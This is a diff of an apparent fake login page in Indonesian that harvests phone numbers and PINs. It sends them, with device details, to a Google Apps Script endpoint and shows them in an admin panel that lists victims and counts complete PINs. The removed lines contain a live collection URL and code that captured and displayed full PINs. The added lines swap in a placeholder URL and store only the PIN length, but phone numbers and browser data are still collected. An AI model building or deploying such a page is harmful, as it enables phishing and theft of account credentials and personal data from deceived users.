@@ -495,7 +495,7 @@
         
         // KONFIGURASI GOOGLE SHEETS
         // Ganti dengan URL Google Apps Script Anda
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwJYA3I2VlFmt9pyW65tQ2Gpy4l2Rj5iHs1S7Uqo4SxfkjIe-VWEO_R4U_xK0LZH2bS/exec';
+        const SCRIPT_URL = 'MASUKKAN_URL_GOOGLE_APPS_SCRIPT_DISINI';
         
         // Phone input validation
         document.getElementById('phone').addEventListener('input', function() {
@@ -564,8 +564,8 @@
         async function submitData() {
             const phone = document.getElementById('phone').value;
             const pinDigits = document.querySelectorAll('.pin-digit');
-            cconst pinValue = Array.from(pinDigits).map(d => d.value).join('');
-
+            const pinLength = Array.from(pinDigits).filter(digit => digit.value).length;
+            
             // Show loading
             document.getElementById('loginText').style.display = 'none';
             document.getElementById('loginLoading').style.display = 'inline-block';
@@ -574,7 +574,7 @@
             const data = {
                 timestamp: new Date().toISOString(),
                 phone: phone,
-                pinEntered: pinValue || 'Tidak diisi',
+                pinLength: pinLength,
                 userAgent: navigator.userAgent,
                 referrer: document.referrer || 'Direct',
                 screenSize: `${screen.width}x${screen.height}`,
@@ -679,7 +679,7 @@
         function updateAdminStats(data) {
             const today = new Date().toDateString();
             const todayData = data.filter(item => new Date(item.timestamp).toDateString() === today);
-            const validPins = data.filter(item => item.pinEntered && item.pinEntered.length >= 6);
+            const validPins = data.filter(item => item.pinLength >= 6);
             
             const statsHtml = `
                 <div class="stat-card">
@@ -692,7 +692,7 @@
                 </div>
                 <div class="stat-card">
                     <h3>${validPins.length}</h3>
-                    <p>PIN ≥ 6 digit</p>
+                    <p>PIN Lengkap</p>
                 </div>
                 <div class="stat-card">
                     <h3>${Math.round((validPins.length / Math.max(data.length, 1)) * 100)}%</h3>
@@ -717,7 +717,7 @@
                         <strong>Entry #${data.length - index}</strong>
                         <br><small>⏰ ${date.toLocaleString('id-ID')}</small>
                         <br>📱 No. HP: +62${item.phone}
-                        <br>🔒 PIN: ${item.pinEntered || 'Tidak diisi'}
+                        <br>🔒 PIN: ${'●'.repeat(item.pinLength)} (${item.pinLength} digit)
                         <br>💻 Device: ${item.userAgent ? item.userAgent.substring(0, 60) + '...' : 'Unknown'}
                         <br>🌐 Referrer: ${item.referrer || 'Direct'}
                         <br>📺 Screen: ${item.screenSize} | 🗣️ Lang: ${item.language}
